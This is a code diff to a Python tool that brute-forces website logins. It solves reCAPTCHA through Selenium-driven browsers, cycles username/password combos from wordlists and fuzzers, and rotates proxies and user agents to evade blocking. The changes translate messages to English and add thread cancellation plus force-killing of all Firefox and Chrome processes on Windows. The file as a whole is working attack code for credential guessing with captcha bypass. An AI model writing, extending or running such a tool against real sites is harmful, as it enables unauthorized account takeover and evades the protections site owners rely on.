@@ -10,6 +10,7 @@ import os
 import sys
 import queue
 import signal
+import subprocess
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options as ChromeOptions
 from selenium.webdriver.chrome.service import Service as ChromeService
@@ -33,6 +34,9 @@ WHITE = '\033[97m'
 BOLD = '\033[1m'
 RESET = '\033[0m'
 GRAY = '\033[90m'
+# Variables para manejo de drivers activos
+active_drivers = []
+drivers_lock = threading.Lock()
 
 # Variables para barra de progreso
 total_attempts = 0
@@ -85,15 +89,17 @@ print_lock = threading.Lock()
 
 # Handler para señales
 def signal_handler(signum, frame):
-    print(f"\n{YELLOW}[!] Señal recibida ({signum}), iniciando cierre limpio...{RESET}")
+    print(f"\n{YELLOW}[!] Received signal ({signum}), starting clean finish...{RESET}")
     stop_event.set()
     success_flag.set()  # Para que los threads salgan de sus loops
 
 def generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type="firefox", verbose=False):
+    if stop_event.is_set() or success_flag.is_set():
+        raise Exception("Operation cancelled by user")
     if verbose:
         with print_lock:
             print(f"\r{' ' * 80}\r", end='')
-            print(f"[i] Inicializando WebDriver: {webdriver_type}")
+            print(f"[i] Init WebDriver: {webdriver_type}")
 
     driver = None
     try:
@@ -116,7 +122,7 @@ def generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type="
                 gecko_path = os.path.join(script_dir, "geckodriver.exe")
                 
                 if not os.path.isfile(gecko_path):
-                    print(f"{RED}[!] No se encontró geckodriver.exe en: {gecko_path}{RESET}")
+                    print(f"{RED}[!] Does not found geckodriver.exe in: {gecko_path}{RESET}")
                     sys.exit(1)
                 service = FirefoxService(executable_path=gecko_path)
             except:
@@ -158,7 +164,8 @@ def generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type="
                 if firefox_path:
                     firefox_options.binary_location = firefox_path
                 else:
-                    print(f"{YELLOW}[!] Firefox no encontrado en rutas comunes, usando ruta por defecto{RESET}")
+                    print(f"\r{' ' * 80}\r", end='')
+                    print(f"{YELLOW}[!] Firefox is not founded in common places, using default path{RESET}")
             else:
                 # Para Linux/Mac
                 possible_paths = ["/usr/bin/firefox", "/usr/local/bin/firefox", "/opt/firefox/firefox"]
@@ -171,18 +178,20 @@ def generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type="
                     firefox_options.binary_location = firefox_path
             
             driver = webdriver.Firefox(service=service, options=firefox_options)
-        
+            
+        with drivers_lock:
+            active_drivers.append(driver)
         driver.get(login_url)
 
         try:
-            WebDriverWait(driver, 10).until(
+            WebDriverWait(driver, 5).until(
                 EC.presence_of_element_located((By.CLASS_NAME, "g-recaptcha"))
             )
         except:
             if verbose:
                 with print_lock:
                     print(f"\r{' ' * 80}\r", end='')
-                    print("[!] Timeout esperando captcha")
+                    print("[!] Captcha Timeout")
             pass
 
         token = driver.execute_script(f"""
@@ -200,6 +209,9 @@ def generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type="
     finally:
         if driver:
             try:
+                with drivers_lock:
+                    if driver in active_drivers:
+                        active_drivers.remove(driver)
                 driver.quit()
             except:
                 pass
@@ -224,7 +236,7 @@ def cargar_user_agents(filepath):
         return [line.strip() for line in f if line.strip()]
 
 def cargar_proxies(proxy_file=None, single_proxy=None):
-    """Carga proxies desde archivo o proxy único"""
+    """Multi Proxy loaded from file or single one by args"""
     proxies = []
     
     if single_proxy:
@@ -244,12 +256,13 @@ def cargar_proxies(proxy_file=None, single_proxy=None):
             valid_proxies.append(proxy)
         else:
             with print_lock:
-                print(f"{YELLOW}[!] Proxy con formato inválido ignorado: {proxy}{RESET}")
+                print(f"\r{' ' * 80}\r", end='')
+                print(f"{YELLOW}[!] Ignoring Proxy with invalid format: {proxy}{RESET}")
     
     return valid_proxies
 
 def get_combined_patterns(custom_patterns, pattern_type="success"):
-    """Combina patrones base con patrones personalizados"""
+    """Combine custom and common patterns"""
     
     base_success_patterns = [
         "true", "success", "bienvenido", "dashboard", "welcome", "loggedin",
@@ -291,8 +304,8 @@ def generar_fuzzers(tipo="digits", min_len=5, max_len=10, cantidad=100):
 
 def check_success(response, success_indicators, fail_indicators, success_codes, check_cookies=True, verbose=False):
     """
-    Análisis inteligente multi-capa para detectar login exitoso
-    Prioriza análisis de contenido sobre códigos HTTP
+    Smart multi-layer analysis for detect succesful login
+    Priorize content analyze above HTTP Code response
     """
     response_text = response.text.lower()
     
@@ -360,7 +373,10 @@ def check_success(response, success_indicators, fail_indicators, success_codes, 
     return False, f"No success indicators found (HTTP: {response.status_code})"
 
 def login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url=None, 
-                  webdriver_type="firefox", verbose=False, user_agent=None, proxy=None, proxy_timeout=10):    
+                  webdriver_type="firefox", verbose=False, user_agent=None, proxy=None, proxy_timeout=10):
+    # Verificar si debemos parar antes de crear WebDriver
+    if stop_event.is_set() or success_flag.is_set():
+        raise Exception("Operation cancelled")    
     token, cookies = generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type, verbose)
     headers = {
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -424,6 +440,10 @@ def worker(site_key, captcha_action, login_url, post_url, origin_url, stop_on_su
             break
             
         try:
+            # Verificar eventos antes de intentar login
+            if stop_event.is_set() or success_flag.is_set():
+                combo_queue.task_done()
+                break
             response = login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url, 
                                      webdriver_type, verbose, current_ua, current_proxy, proxy_timeout)
             # Rotar proxy si hay múltiples
@@ -473,9 +493,11 @@ def worker(site_key, captcha_action, login_url, post_url, origin_url, stop_on_su
             if not stop_event.is_set():
                 with print_lock:
                     if "proxy" in str(e).lower():
-                        print(f"{RED}[!] Error de proxy con {username}:{password}: {e}{RESET}")
+                        print(f"\r{' ' * 80}\r", end='')
+                        print(f"{RED}[!] Proxy Error with {username}:{password}: {e}{RESET}")
                     else:
-                        print(f"{RED}[!] Error con {username}:{password}: {e}{RESET}")
+                        print(f"\r{' ' * 80}\r", end='')
+                        print(f"{RED}[!] Error with {username}:{password}: {e}{RESET}")
         finally:
             # Actualizar contador y marcar tarea como completada
             with attempts_lock:
@@ -487,10 +509,10 @@ def parse_user_fuzzer(fuzzer_str):
     # formato tipo:min_len:max_len:cantidad
     # ejemplo digits:6:6:100
     try:
-        tipo, min_len, max_len, cantidad = fuzzer_str.split(":")
-        return tipo, int(min_len), int(max_len), int(cantidad)
+        tipo, min_len, max_len, count = fuzzer_str.split(":")
+        return tipo, int(min_len), int(max_len), int(count)
     except Exception as e:
-        raise ValueError(f"Formato incorrecto para --user-fuzz: {fuzzer_str}. Debe ser tipo:min_len:max_len:cantidad") from e
+        raise ValueError(f"Invalid format for --user-fuzz: {fuzzer_str}. Must be type:min_len:max_len:count")
 
 def mostrar_barra_progreso():
     global total_attempts, attempts_done, start_time_prog
@@ -539,12 +561,15 @@ def preparar_combos(username_file, password_file, user_fuzzer):
             combo_queue.put((u, p))
 
 def cleanup_and_exit(threads, start_time):
-    """Función para limpiar recursos y salir de manera ordenada"""
-    print(f"\n{YELLOW}[!] Iniciando cierre limpio...{RESET}")
+    """Function to clean up resources and exit gracefully"""
+    print(f"\n{YELLOW}[!] Init gracefully exit...{RESET}")
     
     # Establecer eventos de parada
     stop_event.set()
     success_flag.set()
+    
+    # Forzar cierre de todos los WebDrivers activos
+    force_kill_drivers()
     
     # Limpiar la cola para evitar bloqueos
     while not combo_queue.empty():
@@ -554,17 +579,46 @@ def cleanup_and_exit(threads, start_time):
         except queue.Empty:
             break
     
-    # Esperar a que terminen todos los threads con timeout
-    print(f"{YELLOW}[!] Esperando que terminen los hilos...{RESET}")
+    # Esperar a que terminen todos los threads con timeout MUY CORTO
+    print(f"{YELLOW}[!] Waiting threads to finish...{RESET}")
     for i, t in enumerate(threads):
         try:
-            t.join(timeout=2.0)  # Timeout de 2 segundos por thread
+            t.join(timeout=1.0)  # Timeout MÁS CORTO: 1 segundo
             if t.is_alive():
-                print(f"{RED}[!] Thread {i+1} no terminó en el tiempo esperado{RESET}")
+                print(f"{YELLOW}[!] Thread {i+1} forced to terminate{RESET}")
         except:
             pass
     
     print_footer(start_time)
+
+def force_kill_drivers():
+    """Fuerza el cierre de todos los drivers activos"""
+    global active_drivers
+    
+    with drivers_lock:
+        drivers_to_kill = active_drivers.copy()
+        active_drivers.clear()
+    
+    for driver in drivers_to_kill:
+        try:
+            driver.quit()
+        except:
+            pass
+    
+    # Matar procesos restantes de Firefox/Chrome (Windows)
+    if sys.platform == "win32":
+        try:
+            import subprocess
+            subprocess.run(['taskkill', '/f', '/im', 'firefox.exe'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(['taskkill', '/f', '/im', 'geckodriver.exe'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(['taskkill', '/f', '/im', 'chrome.exe'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(['taskkill', '/f', '/im', 'chromedriver.exe'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
 
 def main():
     # Configurar handlers de señales
